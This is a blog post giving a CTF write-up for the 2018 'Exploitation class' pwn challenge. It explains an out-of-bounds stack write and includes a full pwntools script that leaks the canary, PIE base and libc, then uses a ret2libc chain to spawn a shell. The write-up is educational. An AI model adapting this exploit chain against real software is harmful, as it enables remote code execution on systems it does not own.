<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>[P.W.N. CTF 2018] Exploitation class</title>
	
	<meta name="author" content="Quentin Meffre">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">
	<link href="/assets/css/syntax.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/meffre-q">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/0xdagger">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
				quentin meffre
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="/assets/media/myavatar-1-.png" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">quentin meffre</a>
    </h3>
</header>


<div id="bio" class="text-center">
	Computer science student, passionate about Cyber Security.
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/meffre-q">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/0xdagger">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/quentin-meffre">
				<i class="fa fa-linkedin fa-lg"></i>
			</a>
		</li>
		
		<li>
			<a class="btn btn-default btn-sm" href="/feed.xml">
				<i class="fa fa-rss fa-lg"></i>
			</a>
		</li>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>[P.W.N. CTF 2018] Exploitation class </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   October 
	   28th,
	   
	   2018
	 </span>
	  <div class="article_body">
	  <p><strong>Points:</strong> 200 <strong>Category:</strong> Exploitation <strong>Author:</strong> Dagger</p>

<h2 id="introduction">Introduction</h2>

<p>In this challenge, we are given an ELF 64 bits binary with its C library. The binary is very simple, it allow us to edit/read the content of an array.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./exploitClass 
Welcome to the student registration service for the binary exploitation class in WS18!
Enter 1 to read, 2 to write and any other number to exit!
1
Which entry to show?
0
John
Enter 1 to read, 2 to write and any other number to exit!
2
Which entry to write?
0
What to write?
toto
Enter 1 to read, 2 to write and any other number to exit!
1
Which entry to show?
0
toto
</code></pre></div></div>

<h2 id="vulnerability">Vulnerability</h2>

<p>The vulnerability is located in the <code class="highlighter-rouge">writeData</code> function.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">writeData</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">entry_array</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
    
  <span class="n">puts</span><span class="p">(</span><span class="s">"Which entry to write?"</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&lt;=</span> <span class="mi">252</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"What to write?"</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">entry_array</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">*</span> <span class="n">index</span><span class="p">),</span> <span class="mi">12</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This function write some data at a given index which is multiplied by 12. There is an <code class="highlighter-rouge">if</code> condition which check that the index is in the good range. But the condition is done before to have multiplied the index by 12. So we can overwrite the data on the stack which are located above the array.</p>

<h2 id="exploitation">Exploitation</h2>

<p>The exploitation is more complex by the fact that:</p>

<ul>
  <li>The binary is compiled with the Position Independant Executable protection (We need a leak in order to do a <code class="highlighter-rouge">ROP</code>) ;</li>
  <li>The binary is compiled with the Stack Smash Protection (We need to take care of the canary) ;</li>
  <li>The binary is FULL RELRO (We can’t overwrite the GOT entry) ;</li>
  <li>The binary also has No eXecutable stack (We can’t execute a shellcode) ;</li>
</ul>

<p>Using both <code class="highlighter-rouge">writeData</code> and <code class="highlighter-rouge">readData</code> functions we can easily leak the data which are above our array. To do this we are going to fill the last entry of the array with some printable character until we reach an address above the array. (The function used to print the data in readData() is puts())</p>

<p>The exploitation technique is in four parts:</p>

<ul>
  <li>Leak the canary which is the first value above our array ;</li>
  <li>Leak one of the .text address which is the next one after the canary. This address is the <code class="highlighter-rouge">__lib_csu_init</code> address. Using this leak we can easily calculate the binary base address and so on, defeat the PIE protection.</li>
  <li>Set again the canary value as we needed to overwrite it in order to leak the previous address.</li>
  <li>Overwrite the <code class="highlighter-rouge">saved RIP</code> with our gadget. I choose a basic ROP technique, ret2plt to leak the LibC, ret2main and then ret2libc.</li>
</ul>

<p>Here is the final exploit:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">Pwn</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./exploitClass"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">start_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"class.uni.hctf.fun"</span><span class="p">,</span> <span class="mi">24241</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"exit!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">read_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"show?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">data</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"exit!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">data</span>

    <span class="k">def</span> <span class="nf">write_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"write?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"write?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"exit!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">leak_libc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bin_base</span><span class="p">,</span> <span class="n">leak_canary</span><span class="p">):</span>
        <span class="n">pop_rdi</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_base</span><span class="o">+</span><span class="mh">0x14a3</span><span class="p">)</span>
        <span class="n">puts_got</span><span class="o">=</span><span class="n">bin_base</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
        <span class="n">puts_plt</span><span class="o">=</span><span class="n">bin_base</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
        <span class="n">main_addr</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_base</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak_canary</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">26</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">main_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">27</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">[</span><span class="mi">4</span><span class="p">:],</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
        <span class="n">data</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"exit!</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">17</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">data</span>

    <span class="k">def</span> <span class="nf">exec_system</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">bin_base</span><span class="p">):</span>
        <span class="n">pop_rdi</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_base</span><span class="o">+</span><span class="mh">0x14a3</span><span class="p">)</span>
        <span class="n">system_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
        <span class="n">bin_sh_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">26</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">pwn_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">start_binary</span><span class="p">()</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="s">"A"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">leak_canary</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">read_data</span><span class="p">(</span><span class="mi">21</span><span class="p">)[</span><span class="mi">13</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">leak_canary</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">leak_canary</span><span class="p">)</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak canary: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_canary</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_data</span><span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">bin_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">read_data</span><span class="p">(</span><span class="mi">21</span><span class="p">)[</span><span class="mi">28</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__libc_csu_init"</span><span class="p">]</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak binary base address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_base</span><span class="p">))</span>

        <span class="n">libc_base</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">leak_libc</span><span class="p">(</span><span class="n">bin_base</span><span class="p">,</span> <span class="n">leak_canary</span><span class="p">)</span><span class="o">-</span><span class="bp">self</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak base libc address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">exec_system</span><span class="p">(</span><span class="n">libc_base</span><span class="p">,</span> <span class="n">bin_base</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">pwn</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">pwn_binary</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>Let’s try it:</p>

<p><img src="/assets/media/exploit_class_flag.png" alt="Flag" /></p>

<p>Done.</p>

<p>Ps: You can find the binary and the exploit <a href="https://github.com/meffre-q/ctf/tree/master/2018/PWN/pwn/exploit_class">here</a></p>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#write-up-ref">
					write-up <span>(7)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#pwn-ref">
					pwn <span>(14)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#exploit-ref">
					exploit <span>(2)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#Out Of Bound-ref">
					Out Of Bound <span>(1)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[P.W.N. CTF 2018] Exploitation class&via=0xdagger"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
        <h4 class="section-title author-name">Quentin Meffre</h4>
        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/write-up/2018/03/04/write_up_pragyan.html" title="[Write-Up] Pragyan CTF - Old school hack">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/exploit/heap/2018/11/02/fastbin_attack.html" title="Fast bin attack">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2018 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-90952644-1', 'auto');
  ga('send', 'pageview');
</script>

